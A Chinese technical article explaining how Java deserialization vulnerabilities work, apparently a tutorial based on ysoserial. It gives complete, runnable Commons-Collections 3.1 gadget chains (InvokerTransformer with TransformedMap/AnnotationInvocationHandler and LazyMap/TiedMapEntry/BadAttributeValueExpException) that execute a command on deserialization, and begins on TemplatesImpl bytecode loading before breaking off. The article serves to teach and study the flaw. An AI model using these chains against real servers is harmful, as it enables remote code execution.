---
title: Java反序列化漏洞的原理分析
---
# Java 反序列化漏洞的原理分析

世界上有三件事最难

* 把别人的钱装进自己的口袋里

* 把自己的想法装进别人的脑袋里

* 让自己的代码运行在别人的服务器上

## 前言

Java 反序列化漏洞是近一段时间里一直被重点关注的漏洞，自从 [Apache Commons-collections](http://commons.apache.org/proper/commons-collections/) 爆出第一个漏洞开始，围绕着 Java 反序列化漏洞的事件就层出不穷，为了详细了解 Java 反序列化漏洞的成因和原理，本文将以 [ysoserial](https://github.com/frohoff/ysoserial) 项目作为基础，以普通 Java 工程师的角度来逐步解释这类漏洞的原理。

本文涉及了大量的源码，尽可能保证开发者能够快速搭建实验环境进行漏洞的复现。Java 反序列漏洞涉及大量的 Java 基础，而漏洞利用过程复杂巧妙，为了清晰地表达出其中的原理，粘贴了大量的代码片段。

## 核心要点

* ### Java 反序列化与 [ObjectInputStream](https://docs.oracle.com/javase/10/docs/api/java/io/ObjectInputStream.html)

  在 Java 中,利用 ObjectInputStream 的 readObject 方法进行对象读取时，当目标对象已经重写了 readObject 方法，则调用目标对象 readObject 方法。如下代码所示

  ```java
  public class ReadObject implements Serializable {

    private void readObject(java.io.ObjectInputStream stream)
            throws IOException, ClassNotFoundException{
        System.out.println("read object in ReadObject");
    }

    public static void main(String[] args) throws IOException, ClassNotFoundException {
        byte[] serializeData=serialize(new ReadObject());
        deserialize(serializeData);
    }

    public static byte[] serialize(final Object obj) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        return out.toByteArray();
    }

    public static Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
         ByteArrayInputStream in = new ByteArrayInputStream(serialized);
         ObjectInputStream objIn = new ObjectInputStream(in);
         return objIn.readObject();
    }
  }
  ```

  以上代码将会输出

  ```text
    read object in ReadObject
  ```

  可见在反序列化的过程中,如果目标对象的 readObject 进行了一些更复杂的操作的时候,那么极有可能给恶意代码提供可乘之机。

* ### 利用 java 的反射来执行代码

  Java 的反射机制提供为 Java 工程师的开发提供了相当多的便利性，同样也带来了潜在的安全风险。反射机制的存在使得我们可以越过 Java 本身的静态检查和类型约束，在运行期直接访问和修改目标对象的属性和状态。
  Java 反射的四大核心是 Class，Constructor，Field，Method，如下代码所示。我们将利用 Java 的反射机制来操纵代码调用本地的计算器

  ```java
  public static void main(String[] args) throws Exception {

    Object runtime=Class.forName("java.lang.Runtime")
      .getMethod("getRuntime",new Class[]{})
      .invoke(null);
    Class.forName("java.lang.Runtime")
      .getMethod("exec", String.class)
      .invoke(runtime,"calc.exe");
    }
  ```

  以上代码中,我们利用了 Java 的反射机制把我们的代码意图都利用字符串的形式进行体现，使得原本应该是字符串的属性，变成了代码执行的逻辑，而这个机制也是我们后续的漏洞使用的前提。

## 从零开始

为了尽可能地将 Java 反序列化漏洞的原理讲述清楚，在本章节中，我们将站在一个攻击者和漏洞利用者的角度去观察如何使用 Java 的反序列化漏洞。

* ### 环境

  要完成实验需要添加如下版本的库

  ```XML
    <dependency>
      <groupId>org.apache.commons</groupId>
      <artifactId>commons-collections4</artifactId>
      <version>4.0</version>
    </dependency>

    <dependency>
      <groupId>commons-collections</groupId>
      <artifactId>commons-collections</artifactId>
      <version>3.1</version>
    </dependency>

    <!-- 用于修改字节码-->
    <dependency>
      <groupId>org.javassist</groupId>
      <artifactId>javassist</artifactId>
      <version>3.22.0-GA</version>
    </dependency>
  ```

* ### 靶子

  在进行攻击之前,我们需要模拟出一个靶子，靶子代码如下，其主要功能是监听本地端口，并将端口中的数据进行反序列化。

  ```java
    public static void main(String[] args) throws IOException {
        ServerSocket server = new ServerSocket(10000);
        while (true) {
            Socket socket = server.accept();
            execute(socket);
        }
    }
    public static void execute(final Socket socket){
        new Thread(new Runnable() {
            public void run() {
                try {
                    ObjectInputStream is  = new ObjectInputStream(new BufferedInputStream(socket.getInputStream()));
                    Object obj = is.readObject();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
  ```

  然而为了更加容易的测试，我们可以将上述的过程描绘为

  * 构造一个恶意的 Java 对象
  * 将这个对象序列化到一个 byte 数组
  * 从这个 byte 数组利用反序列化还原对象
  * 如果在反序列化的过程中执行了恶意对象的代码，视为漏洞利用成功

  因此我们可以将测试的代码简化如下

  ```java
    public static void main(String[] args) throws Exception {
        deserialize(serialize(getObject()));
    }
    //在此方法中返回恶意对象
    public static Object getObject(){
        return "";
    }

    public static byte[] serialize(final Object obj) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        return out.toByteArray();
    }

    public static Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
        ByteArrayInputStream in = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(in);
        return objIn.readObject();
    }
  ```

* ### 恶意代码

  在进行攻击之前，我们将构造出一段恶意代码，该恶意代码的主要功能是运行对方电脑上的计算器

  ```java
    public static void main(String[] args) throws IOException {
        Runtime.getRuntime().exec("calc.exe");
    }
  ```

* ### 恶意代码的包装

  Java 的反序列化漏洞中,目前我们只能传输一个对象的属性与状态，而不是字节码，因此我们就需要使用 Java 的反射技术来将我们的代码意图进行掩盖，以确保我们的恶意代码能传输到目标服务器上。为了演示出一个 "合格" 的漏洞代码，我们构建了一个 Java 类,代码如下所示。

  一个由我们构造的满足入侵条件的 Java 反序列化漏洞案例

  ```java
  public class ReflectionPlay implements Serializable{

    public static void main(String[] args) throws Exception {
        new ReflectionPlay().run();
    }

    public void run() throws Exception {
        byte[] ObjectBytes=serialize(getObject());
        deserialize(ObjectBytes);
    }

    //在此方法中返回恶意对象
    public Object getObject() {
        String command = "calc.exe";
        Object firstObject = Runtime.class;
        ReflectionObject[] reflectionChains = {
                //调用 Runtime.class 的getMethod方法,寻找 getRuntime方法，得到一个Method对象(getRuntime方法)
                //等同于 Runtime.class.getMethod("getRuntime",new Class[]{String.class,Class[].class})
                new ReflectionObject("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                //调用 Method 的 invoker 方法可以得到一个Runtime对象
                // 等同于 method.invoke(null),静态方法不用传入对象
                new ReflectionObject("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                //调用RunTime对象的exec方法,并将 command作为参数执行命令
                new ReflectionObject("exec", new Class[]{String.class}, new Object[]{command})
        };

        return new ReadObject(new ReflectionChains(firstObject, reflectionChains));
    }

    /*
     * 序列化对象到byte数组
     * */
    public byte[] serialize(final Object obj) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        return out.toByteArray();
    }

    /*
     * 从byte数组中反序列化对象
     * */
    public Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
        ByteArrayInputStream in = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(in);
        return objIn.readObject();
    }

    /*
    * 一个模拟拥有漏洞的类，主要提供的功能是根据自己的属性中的值来进行反射调用
    * */
    class ReflectionObject implements Serializable{
        private String methodName;
        private Class[] paramTypes;
        private Object[] args;

        public ReflectionObject(String methodName, Class[] paramTypes, Object[] args) {
            this.methodName = methodName;
            this.paramTypes = paramTypes;
            this.args = args;
        }

        //根据  methodName, paramTypes 来寻找对象的方法，利用 args作为参数进行调用
        public Object transform(Object input) throws Exception {
            Class inputClass = input.getClass();
            return inputClass.getMethod(methodName, paramTypes).invoke(input, args);
        }
    }

    /*
    * 一个用来模拟提供恶意代码的类,
    * 主要的功能是将 ReflectionObject进行串联调用,与ReflectionObject一起构成漏洞代码的一部分
    * */
    class ReflectionChains implements Serializable{

        private Object firstObject;
        private ReflectionObject[] reflectionObjects;

        public ReflectionChains(Object firstObject, ReflectionObject[] reflectionObjects) {
            this.firstObject = firstObject;
            this.reflectionObjects = reflectionObjects;
        }

        public Object execute() throws Exception {
            Object concurrentObject = firstObject;
            for (ReflectionObject reflectionObject : reflectionObjects) {
                concurrentObject = reflectionObject.transform(concurrentObject);
            }
            return concurrentObject;
        }
    }

    /**
     * 一个等待序列化的类,拥有一个属性和一个重写了的readObject方法
     * 并且在readObject方法中执行了该属性的一个方法
     * */
    class ReadObject implements Serializable {

        private ReflectionChains reflectionChains;

        public ReadObject(ReflectionChains reflectionChains) {
            this.reflectionChains = reflectionChains;
        }
        //当反序列化的时候，这个代码会被调用
        //该方法被调用的时候其属性都是空
        private void readObject(java.io.ObjectInputStream stream)
                throws IOException, ClassNotFoundException {
            try {
                //用来模拟当readObject的时候，对自身的属性进行了一些额外的操作
                reflectionChains= (ReflectionChains) stream.readFields().get("reflectionChains",null);
                reflectionChains.execute();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
  }
  ```

## 实施攻击的三个条件

为了实现一个攻击行为，我们需要从目标的系统中找到如下三个条件相关的类，然后将他们合理利用起来。根据漏洞利用过程我们将这三个条件比喻成三个模块以便于理解。

1.  无德的病毒

    无德的病毒指的是,依托 Java 本身的特性，将恶意代码包装到一个正常的调用流程里，使得在被触发的时候执行恶意的代码逻辑。在上述的模拟代码中 ReflectionObject 就承担这样的角色。

2.  无辜的宿主

    无辜的宿主只的是最终被序列化的对象，无辜的原因在于该对象在实现自己的 readObject 方法的时候并没有意识到自身的逻辑在对自身属性进行操作的时候会被恶意代码寄生。上述模拟代码的 ReadObject 就是这样的角色。

3.  无良的媒介

    无良的媒介指的是，用来将无德的病毒层层包装之后，放入宿主对象的一系列工具类，他们被创造的本意不是为了给病毒利用，而是被攻击者用来将恶意的代码包装到宿主能够接受的类型中。上述模拟代码的 ReflectionChains 就是这样的一个角色。

    现在我们将以 Commons-collections 3.1 被初次爆出反序列化漏洞的事件为例子，展示在攻击过程中需要构建的要素。

* ### 无德的病毒(一个可以进行序列化的恶意对象)

  在利用漏洞之前，我们需要找到一个可以实现执行恶意代码的工具类，他们的作用是将我们的恶意代码伪装起来，并且在一个合理的时机里触发我们的恶意代码。

  在上述我们构造的模拟漏洞中，ReflectionObject，ReflectionChains 就承担了将恶意代码包装到属性中的行为，并且可以在一个合理的时间中爆发。

  在 Commons-collections 3.1 的反序列化漏洞中如下的几个类就可以利用来包装我们的恶意代码。

  > org.apache.commons.collections.Transformer
  > org.apache.commons.collections.functors.ChainedTransformer
  > org.apache.commons.collections.functors.ConstantTransformer
  > org.apache.commons.collections.functors.InvokerTransformer

  ```java
  Transformer[] transformers = new Transformer[]{
          new ConstantTransformer(Runtime.class),
          new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},new Object[]{"getRuntime", new Class[0]}),
          new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null, new Object[0]}),
          new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe",}),
  };
  Transformer transformerChain = new ChainedTransformer(transformers);

  //测试我们的恶意对象是否可以被序列化
  ByteArrayOutputStream out = new ByteArrayOutputStream();
  ObjectOutputStream objOut = new ObjectOutputStream(out);
  objOut.writeObject(transformerChain);

  //执行以下语句就可以调用起计算器
  transformerChain.transform(null);
  ```

  利用以上的代码，我们可以看到我们的计算器被执行了，因此我们就达成了我们的第一步，构建一个可以执行恶意代码的对象

* ### 无辜的宿主(一个实现 readObject 方法且可能存在其他可利用行为的 Serializable 类)

  在构建好一个恶意对象之后，我们需要寻找到一个 readObject 的突破口，如上述模拟漏洞的 ReadObject 一样，在序列化的过程中会做一些额外的操作，在这些操作中，一些行为可以利用，一些不可能利用，我们要找出一个可以利用的突破口来，并以此作为我们最终序列化的对象，该对象就像一个被寄生的宿主一样，最主要的目的就是被送到目标服务器中，并在反序列化的时候触发恶意代码。

* #### AnnotationInvocationHandler

  例如在 Java 的低版本代码中存在如下的一个对象
  注：在高版本的 1.8 JDK 往后的 JDK 中该类的代码已经被修改，而无法使用，因此如果你需要做这个实验的话，需要安装 1.8 的低版本 JDK，例如在 1.8 u60 中该代码可以被使用。

  > sun.reflect.annotation.AnnotationInvocationHandler

  [openjdk 8u60 AnnotationInvocationHandler](http://hg.openjdk.java.net/jdk8u/jdk8u60/jdk/file/935758609767/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java)

  其中 readObject 方法如下所示

  ```java
      private void readObject(java.io.ObjectInputStream s)
          throws java.io.IOException, ClassNotFoundException {
      s.defaultReadObject();

      // Check to make sure that types have not evolved incompatibly

      AnnotationType annotationType = null;
      try {
          annotationType = AnnotationType.getInstance(type);
      } catch (IllegalArgumentException e) {
          // Class is no longer an annotation type; time to punch out
          throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
      }

      Map<String, Class<?>> memberTypes = annotationType.memberTypes();

      // If there are annotation members without values, that
      // situation is handled by the invoke method.
      for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
          String name = memberValue.getKey();
          Class<?> memberType = memberTypes.get(name);
          if (memberType != null) {  // i.e. member still exists
              Object value = memberValue.getValue();
              if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                  memberValue.setValue(
                          new AnnotationTypeMismatchExceptionProxy(
                                  value.getClass() + "[" + value + "]").setMember(
                                  annotationType.members().get(name)));
              }
          }
      }
  }
  ```

  让我们把目光转移到 memberValue.setValue() 这一行函数上,从我们的模拟漏洞类中，我们可以知道，如果我们可以让 memberValue.setValue()在触发的时候能够执行我们的恶意代码，那么我们的漏洞入侵就算成功了。那么去哪里寻找媒介呢，能够让 memberValue 在 setValue 的时候执行我们之前构造好的恶意代码呢？

* #### BadAttributeValueExpException

  如果你当前的实验版本已经不支持 AnnotationInvocationHandler(高于 8u66 的都不支持),那么可以采用 BadAttributeValueExpException,这是一个在当前版本内都能利用的对象（jdk9u4 以下都有效果）。

  [BadAttributeValueExpException](http://hg.openjdk.java.net/jdk9/jdk9/jdk/file/65464a307408/src/java.management/share/classes/javax/management/BadAttributeValueExpException.java)

  ```java
  private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
      ObjectInputStream.GetField gf = ois.readFields();
      Object valObj = gf.get("val", null);

      if (valObj == null) {
          val = null;
      } else if (valObj instanceof String) {
          val= valObj;
      } else if (System.getSecurityManager() == null
              || valObj instanceof Long
              || valObj instanceof Integer
              || valObj instanceof Float
              || valObj instanceof Double
              || valObj instanceof Byte
              || valObj instanceof Short
              || valObj instanceof Boolean) {
          val = valObj.toString();
      } else { // the serialized object is from a version without JDK-8019292 fix
          val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
      }
  }
  ```

  BadAttributeValueExpException 的 readObject 里有一个 valObj.toString()的调用，如果我们能够让恶意对象在 Object.toString()的时候被调用，那么我们就能成功的利用了

* ### 无良的媒介(用来构建恶意对象到触发对象的包装类)

  为了让我们的恶意对象，能够成功寄身在宿主中，我们还需要一系列的转换工具和调用过程。让我们以上文中提到的可以执行任意命令的 ChainedTransformer 类和 readObject 的时候会操作自身 memberValue 的 AnnotationInvocationHandler 类为目标，利用 Commons-collections 3.1 提供的工具类来进行包装。

* #### 首先我们要观察宿主 AnnotationInvocationHandler

  [AnnotationInvocationHandler](http://hg.openjdk.java.net/jdk8u/jdk8u60/jdk/file/935758609767/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java)

  ```java
  class AnnotationInvocationHandler implements InvocationHandler, Serializable {
      private static final long serialVersionUID = 6182022883658399397L;
      private final Class<? extends Annotation> type;
      private final Map<String, Object> memberValues;

      AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
          Class<?>[] superInterfaces = type.getInterfaces();
          if (!type.isAnnotation() ||
                  superInterfaces.length != 1 ||
                  superInterfaces[0] != java.lang.annotation.Annotation.class)
              throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
          this.type = type;
          this.memberValues = memberValues;
      }

      /*
      * 此处省略无关代码...
      * */

      private void readObject(java.io.ObjectInputStream s)
              throws java.io.IOException, ClassNotFoundException {
          s.defaultReadObject();

          // Check to make sure that types have not evolved incompatibly

          AnnotationType annotationType = null;
          try {
              annotationType = AnnotationType.getInstance(type);
          } catch(IllegalArgumentException e) {
              // Class is no longer an annotation type; time to punch out
              throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
          }

          Map<String, Class<?>> memberTypes = annotationType.memberTypes();

          // If there are annotation members without values, that
          // situation is handled by the invoke method.
          for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
              String name = memberValue.getKey();
              Class<?> memberType = memberTypes.get(name);
              if (memberType != null) {  // i.e. member still exists
                  Object value = memberValue.getValue();
                  if (!(memberType.isInstance(value) ||
                          value instanceof ExceptionProxy)) {
                      memberValue.setValue(
                              new AnnotationTypeMismatchExceptionProxy(
                                      value.getClass() + "[" + value + "]").setMember(
                                      annotationType.members().get(name)));
                  }
              }
          }
      }
  }
  ```

  我们可以看到 AnnotationInvocationHandler 是一个 Serializable 且重写了 readObject 方法的类，并且在 readObject 方法中 遍历了自身中类型为 Map 的 memberValues 属性,并对其中的 Entry 对象执行 setValue 操作。

  因此我们只需要

  1. 寻找一个 Map 类,该类的特点是其中的 Entry 在 SetValue 的时候会执行额外的程序
  2. 将这个 Map 类作为参数构建一个 AnnotationInvocationHandler 对象，并序列化

  在进行包装之前，我们先来认识几个 Commons-collections 3.1 中的工具类

  [TransformedMap](https://git-wip-us.apache.org/repos/asf?p=commons-collections.git;a=blob_plain;f=src/java/org/apache/commons/collections/map/TransformedMap.java;h=a5ac310ce9c09e61d59458af8921a5a3324cf2cd;hb=326a1c172f5857709299bc77bd73402352214bbf)

  TransformedMap 是 Commons-collections 3.1 提供的一个工具类，用来包装一个 Map 对象，并且在该对象的 Entry 的 Key 或者 Value 进行改变的时候,对该 Key 和 Value 进行 Transformer 提供的转换操作

  ```java
  public class TransformedMapTest {

      public static void main(String[] args) {
          new TransformedMapTest().run();
      }

      public void run(){
          Map map=new HashMap();
          map.put("key","value");
          //调用目标对象的toString方法
          String command="calc.exe";
          final String[] execArgs = new String[] { command };
          final Transformer[] transformers = new Transformer[] {
                  new ConstantTransformer(Runtime.class),
                  new InvokerTransformer("getMethod", new Class[] {
                          String.class, Class[].class }, new Object[] {
                          "getRuntime", new Class[0] }),
                  new InvokerTransformer("invoke", new Class[] {
                          Object.class, Object[].class }, new Object[] {
                          null, new Object[0] }),
                  new InvokerTransformer("exec",
                          new Class[] { String.class }, execArgs)
          };
          Transformer transformer=new ChainedTransformer(transformers);
          Map<String, Object> transformedMap=TransformedMap.decorate(map,null,transformer);
          for (Map.Entry<String,Object> entry:transformedMap.entrySet()){
              entry.setValue("anything");
          }
      }
  }
  ```

  以上代码,就会调用起我们的计算器。
  由此可见，我们只需要把经过我们包装好的 transformedMap 对象作为 AnnotationInvocationHandler 的属性并序列化，我们就可以在反序列化的时候执行我们的恶意代码。

  完整的代码如下(需要 jdk8u60 以下的版本)

  ```java
  public class CommonCollectionsPlayLoad {

      public static void main(String[] args) throws Exception {
          new CommonCollectionsPlayLoad().run();
      }

      public void run() throws Exception {
          deserialize(serialize(getObject()));
      }

      //在此方法中返回恶意对象
      public Object getObject() throws Exception {
          //构建恶意代码
          String command="calc.exe";
          final String[] execArgs = new String[] { command };
          final Transformer[] transformers = new Transformer[] {
                  new ConstantTransformer(Runtime.class),
                  new InvokerTransformer("getMethod", new Class[] {
                          String.class, Class[].class }, new Object[] {
                          "getRuntime", new Class[0] }),
                  new InvokerTransformer("invoke", new Class[] {
                          Object.class, Object[].class }, new Object[] {
                          null, new Object[0] }),
                  new InvokerTransformer("exec",
                          new Class[] { String.class }, execArgs)
          };
          Transformer transformer=new ChainedTransformer(transformers);

          //将恶意代码包装到目标的 sun.reflect.annotation.AnnotationInvocationHandler 中
          /**
           * 构建一个 transformedMap ,
           * transformedMap的作用是包装一个Map对象,使得每一次在该Map中的Entry进行setValue的时候
           * 都会触发 transformer的transform()方法
           * */
          Map transformedMap=TransformedMap.decorate(new HashedMap(),null,transformer);
          //由于AnnotationInvocationHandler无法直接访问,因此使用反射的方式来构建对象
          final Constructor<?> constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
          constructor.setAccessible(true);
          return constructor.newInstance(Override.class, transformedMap);
      }

      public byte[] serialize(final Object obj) throws IOException {
          ByteArrayOutputStream out = new ByteArrayOutputStream();
          ObjectOutputStream objOut = new ObjectOutputStream(out);
          objOut.writeObject(obj);
          return out.toByteArray();
      }

      public Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
          ByteArrayInputStream in = new ByteArrayInputStream(serialized);
          ObjectInputStream objIn = new ObjectInputStream(in);
          return objIn.readObject();
      }
  }
  ```

* #### 另一个可以使用的宿主 BadAttributeValueExpException

  由于在本文写作的当下,大部分的 Jdk 版本已经高于 8u66,因此 AnnotationInvocationHandler 类已经去除了 setValue 的方法,而导致无法使用，因此大家可以采用 BadAttributeValueExpException 进行实验

  ```java
  public class BadAttributeValueExpException extends Exception   {

      /* Serial version */
      private static final long serialVersionUID = -3105272988410493376L;

      /**
       * @serial A string representation of the attribute that originated this exception.
       * for example, the string value can be the return of {@code attribute.toString()}
       */
      private Object val;

      /**
       * Constructs a BadAttributeValueExpException using the specified Object to
       * create the toString() value.
       *
       * @param val the inappropriate value.
       */
      public BadAttributeValueExpException (Object val) {
          this.val = val == null ? null : val.toString();
      }

      /**
       * Returns the string representing the object.
       */
      public String toString()  {
          return "BadAttributeValueException: " + val;
      }

      private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
          ObjectInputStream.GetField gf = ois.readFields();
          Object valObj = gf.get("val", null);

          if (valObj == null) {
              val = null;
          } else if (valObj instanceof String) {
              val= valObj;
          } else if (System.getSecurityManager() == null
                  || valObj instanceof Long
                  || valObj instanceof Integer
                  || valObj instanceof Float
                  || valObj instanceof Double
                  || valObj instanceof Byte
                  || valObj instanceof Short
                  || valObj instanceof Boolean) {
              val = valObj.toString();
          } else { // the serialized object is from a version without JDK-8019292 fix
              val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
          }
      }
  }
  ```

  BadAttributeValueExpException 与 AnnotationInvocationHandler 利用的原理相同，但是在处理转换的工具上略有不同。接下来我们先分析 BadAttributeValueExpException 的突破口，以及利用该突破口的工具

  **突破口**

  观察 BadAttributeValueExpException 的 readObejct 方法，其中在`System.getSecurityManager() == null`条件满足的时候,会调用 `valObj.toString()`,从攻击思路上看，其他的条件都是无法满足的。因此`valObj.toString()`就成为了我们的突破口。我们要找到一个合适的工具在`toString()`方法被调用的时候会触发我们的恶意代码。

  **媒介工具介绍**

  此时媒介工具我们依然采用 Commons-collections 3.1 提供的类

  [LazyMap](https://git-wip-us.apache.org/repos/asf?p=commons-collections.git;a=blob;f=src/java/org/apache/commons/collections/map/LazyMap.java;h=b07d46ff7bdf88728ea1c74accab6cf771c98531;hb=326a1c172f5857709299bc77bd73402352214bbf)

  LazyMap 是 Commons-collections 3.1 提供的一个工具类,是 Map 的一个实现，主要的内容是利用工厂设计模式，在用户 get 一个不存在的 key 的时候执行一个方法来生成 Key 值
  如下代码所示,当且仅当 get 行为存在的时候 Value 才会被生成

  ```Java
      Map targetMap=LazyMap.decorate(new HashMap(), new Transformer() {
          public Object transform(Object input) {
              return new Date();
          }
      });
      System.out.println(targetMap.get("anything"));
  ```

  以上代码将会打印出当前的运行时间
  大家可以看到 LazyMap,可以在 get 动作触发的时候,执行我们的 Transformer 对象中的 transform 方法，刚好可以用来引爆我们在上面编写的恶意代码。
  然而 BadAttributeValueExpException 的触发点是 toString(),现在我们仍然需要包装这一个 LazyMap

  [TiedMapEntry](https://git-wip-us.apache.org/repos/asf?p=commons-collections.git;a=blob;f=src/java/org/apache/commons/collections/keyvalue/TiedMapEntry.java;h=662a9e58bc958d14b3b0cf07691ee5150d5f05f2;hb=326a1c172f5857709299bc77bd73402352214bbf)

  TiedMapEntry 也存在于 Commons-collections 3.1,该类主要的作用是将一个 Map 绑定到 Map.Entry 下,形成一个映射

  主要代码如下

  ```Java
  public class TiedMapEntry implements Map.Entry, KeyValue, Serializable {

      /** Serialization version */
      private static final long serialVersionUID = -8453869361373831205L;

      /** The map underlying the entry/iterator */
      private final Map map;
      /** The key */
      private final Object key;

      /**
       * Constructs a new entry with the given Map and key.
       *
       * @param map  the map
       * @param key  the key
       */
      public TiedMapEntry(Map map, Object key) {
          super();
          this.map = map;
          this.key = key;
      }

      /**
       * 此处省略部分无关代码....
       * */

      /**
       * Gets the value of this entry direct from the map.
       *
       * @return the value
       */
      public Object getValue() {
          return map.get(key);
      }

      /**
       * Gets a string version of the entry.
       *
       * @return entry as a string
       */
      public String toString() {
          return getKey() + "=" + getValue();
      }
  }
  ```

  让我们看看这个类，首先是`toString()`中调用了`getValue()`,`getValue()`中实际是`map.get(key)`,这样一来我们就构建起了整个调用链接了

  **使用方式**

  让我们从被序列化的类展开来看
  BadAttributeValueExpException 中的属性 Object val --> TiedMapEntry
  TiedMapEntry 的 toString() 方法调用了自身 map 属性的 getValue() 方法 --> LazyMap
  LazyMap 的 getValue 拿到的必然是一个空对象,因此会触发 LazyMap 属性中配置的 Transformer.transform()
  Transformer 是我们构建的包含有恶意代码的对象

  组合后使用的代码如下所示

  ```Java
  public class BadExceptionTest {

      public static void main(String[] args) throws Exception {
          new BadExceptionTest().run();
      }

      public void run() throws Exception {
          deserialize(serialize(getObject()));
      }

      //在此方法中返回恶意对象
      public Object getObject() throws Exception {
          //构建恶意代码
          String command="calc.exe";
          final String[] execArgs = new String[] { command };
          final Transformer[] transformers = new Transformer[] {
                  new ConstantTransformer(Runtime.class),
                  new InvokerTransformer("getMethod", new Class[] {
                          String.class, Class[].class }, new Object[] {
                          "getRuntime", new Class[0] }),
                  new InvokerTransformer("invoke", new Class[] {
                          Object.class, Object[].class }, new Object[] {
                          null, new Object[0] }),
                  new InvokerTransformer("exec",
                          new Class[] { String.class }, execArgs)
          };
          Transformer transformer=new ChainedTransformer(transformers);

          final Map lazyMap = LazyMap.decorate(new HashMap(), transformer);

          TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
          BadAttributeValueExpException val = new BadAttributeValueExpException(null);

          //利用反射的方式来向对象传参
          Field valfield = val.getClass().getDeclaredField("val");
          valfield.setAccessible(true);
          valfield.set(val, entry);
          return val;
      }

      public  byte[] serialize(final Object obj) throws IOException {
          ByteArrayOutputStream out = new ByteArrayOutputStream();
          ObjectOutputStream objOut = new ObjectOutputStream(out);
          objOut.writeObject(obj);
          return out.toByteArray();
      }

      public  Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
          ByteArrayInputStream in = new ByteArrayInputStream(serialized);
          ObjectInputStream objIn = new ObjectInputStream(in);
          return objIn.readObject();
      }

  }
  ```

  以上代码就在我们进行反序列化的过程中调用了我们的计算器

## 漏洞组合盘点

Java 的反序列化漏洞,涉及的范围相当的广泛，以上的例子仅仅是其中的一部分,有的漏洞已经修复了，有的漏洞依然是可以工作的，借此我们将以[ysoserial](https://github.com/frohoff/ysoserial)中涉及到的部分漏洞进行分析和组合，试图从一个更广泛的角度来分析 Java 反序列化漏洞的涉及面

* ### 恶意代码包装

  * **Transformer**

    | 工具类              | 提供者                  |
    | ------------------- | ----------------------- |
    | Transformer         | Commons-collections 3.1 |
    | ChainedTransformer  | Commons-collections 3.1 |
    | ConstantTransformer | Commons-collections 3.1 |
    | InvokerTransformer  | Commons-collections 3.1 |

    使用方式

    ```java
    Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe",}),
    };
    Transformer transformerChain = new ChainedTransformer(transformers);
    ```

  * **xlan**

  介绍
  xlan 是 Java 中内置的一个包(原来是 apache 的,后来并入 Jdk 中变成 com.sun 开头)，是 JAXP 的一部分，用来处理 XML 的,此次的恶意代码利用的是该包内的部分类进行的。原理
  xlan 中有一个类`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`,该类可以让我们向目标服务器传输一段 java 字节码,并可以在特定的方法下利用该字节码来生成一个 java 对象，这个类最初的设计目标作者目前尚未弄明白，但是这个类的的功能却可以让我们远程加载一个 java 类，使得恶意的代码可以被运行。

  [TemplatesImpl](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/8u40-b25/com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java#TemplatesImpl) 主要代码如下

  ```java
  public final class TemplatesImpl implements Templates, Serializable {
    static final long serialVersionUID = 673094361519270707L;
    public final static String DESERIALIZE_TRANSLET = "jdk.xml.enableTemplatesImplDeserialization";

    /**
    * Name of the superclass of all translets. This is needed to
    * determine which, among all classes comprising a translet,
    * is the main one.
    */
    private static String ABSTRACT_TRANSLET
        = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";

    /**
    * Name of the main class or default name if unknown.
    */
    private String _name = null;

    /**
    * Contains the actual class definition for the translet class and
    * any auxiliary classes.
    */
    private byte[][] _bytecodes = null;

    /**
    * Contains the translet class definition(s). These are created when
    * this Templates is created or when it is read back from disk.
    */
    private Class[] _class = null;

    /**
    * The index of the main translet class in the arrays _class[] and
    * _bytecodes.
    */
    private int _transletIndex = -1;

    /**
    * This method generates an instance of the translet class that is
    * wrapped inside this Template. The translet instance will later
    * be wrapped inside a Transformer object.
    */
    private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;

            if (_class == null) defineTransletClasses();

